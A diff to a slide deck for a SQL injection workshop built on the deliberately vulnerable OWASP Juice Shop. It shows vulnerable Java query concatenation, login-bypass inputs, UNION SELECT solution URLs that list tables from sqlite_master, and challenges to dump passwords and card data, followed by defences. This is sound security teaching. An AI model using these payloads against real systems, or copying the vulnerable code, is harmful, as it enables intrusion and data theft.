@@ -48,16 +48,19 @@ Or, attack your own.
 
 ---
 
+## Obligatory xkcd
+
+![Bobby Tables](https://imgs.xkcd.com/comics/exploits_of_a_mom.png)
+
+---
+
 ### SQL Injection
 
 OWASP #1 Vulnerability
 
 * Easy to exploit
-<!-- .element: class="fragment" data-fragment-index="1" -->
 * Common vulnerability
-<!-- .element: class="fragment" data-fragment-index="2" -->
 * Severe impact
-<!-- .element: class="fragment" data-fragment-index="3" -->
 
 ---
 
@@ -90,20 +93,53 @@ SELECT id from users WHERE name = 'alice' AND password = 'supersecret';
 
 ---
 
+### What results from the following input data sets?
+
 ```java
 String query = "SELECT id FROM users " +
    "WHERE name = '" + req.getParameter("username") + "'" +
    "AND password = '" + req.getParameter("password") + "'";
 ```
 
-| # | Username   | Password       | Created SQL Query                                          | Query Result  |
-|:--|:-----------|:---------------|:-----------------------------------------------------------|:--------------|
-| 1 | `horst`    | `n0Rd4kAD3m!E` |                                                            | `42`          |
-| 2 | `'`        | `qwertz`       |                                                            |               |
-| 3 | `'--`      | `abc123`       |                                                            | nothing       |
-| 4 | `horst'--` | `qwertz`       |                                                            |               |
-| 5 |            |                | <small>`SELECT id FROM users WHERE name = 'admin'`</small> | `1`           |
-| 6 |            |                | <small>`SELECT id FROM users`</small>                      | `1`, `2`, ... |
+| # | username  | password |
+|--:|:----------|:---------|
+| 1 | `'`       | `qwerty` |
+| 2 | `'--`     | `abc123` |
+| 3 | `alice'--`| `foobar` |
+
+---
+
+## Challenge
+
+* Login to the Juice Shop as the first valid user (admin)
+* Login as `support@juice-sh.op`
+* Login as an existing user beginning with `J1`
+* Login as user with id = `8`
+
+---
+
+### How can you force the following queries (or equivalent)?
+
+```java
+String query = "SELECT id FROM users " +
+   "WHERE name = '" + req.getParameter("username") + "'" +
+   "AND password = '" + req.getParameter("password") + "'";
+```
+
+* `SELECT id FROM users WHERE name = 'admin'`
+* `SELECT id FROM users WHERE name LIKE 'admin%'`
+* `SELECT id FROM users`
+* `SELECT password FROM users`
+
+---
+
+### How can you get round this (complication)?
+
+```java
+String query = "SELECT id FROM users " +
+   "WHERE (name = '" + req.getParameter("username") + "'" +
+   "AND password = '" + req.getParameter("password") + "')";
+```
 
 ---
 
@@ -116,3 +152,88 @@ String query = "SELECT id FROM users " +
 * `') OR '1'='1`
 * `') OR ('1'='1`
 
+---
+
+### Error visibility
+
+* Sometimes full SQL error output in response - amazing!
+* Sometimes we just see an error
+* Sometimes we see nothing
+
+* Techniques
+
+   * Trial and error
+   * Side channels (e.g. timing)
+
+---
+
+### Union selects
+
+* SQL allows concatenation of queries with the UNION keyword
+
+```
+SELECT name FROM Person WHERE name like 'foo%'
+UNION SELECT name FROM Company where name like 'foo%'
+```
+
+* Column count must match
+* Depending on the database, positional data types must match
+* Data can be extracted from different tables
+* How could we use this??
+
+---
+
+### Challenge
+
+Find another exploitable SQL injection attack in the Juice Bar app
+
+---
+
+### Challenge - Hint
+
+* Look at network traffic
+* What looks like a database call?
+* How can you inject your payload?
+* What might be causing errors?
+
+---
+
+### Challenge
+
+Extract the table definitions
+
+---
+
+### Challenge - Hint
+
+* What database are we hitting?
+* What does the manual say about listing tables / schema?
+* Can we do that via normal SQL queries?
+
+---
+
+### Challenge - Solution
+
+[List tables](https://juice-shop-kfb.herokuapp.com/rest/products/search?q=asdf%27\)\)%20UNION%20select%201,%202,%203,%204,%205,%206,%207,%208,%20tbl_name%20from%20sqlite_master%20--)
+
+[List table descs](https://juice-shop-kfb.herokuapp.com/rest/products/search?q=asdf%27\)\)%20UNION%20select%201,%202,%203,%204,%205,%206,%207,%208,%20sql%20from%20sqlite_master%20--)
+
+---
+
+### Challenge:  Extraction of sensitive data
+
+* Grab the all the encrypted passwords
+* Decrypt admin's password (easily)
+* Dump the credit card data
+
+---
+
+## How to defend against these attacks
+
+* Never insert user input directly into queries
+* Use prepared statements
+* Stored procedures?
+* White-list input (inflexible)
+* Black-list input (breakable)
+* Don't use a database
+* Have no users
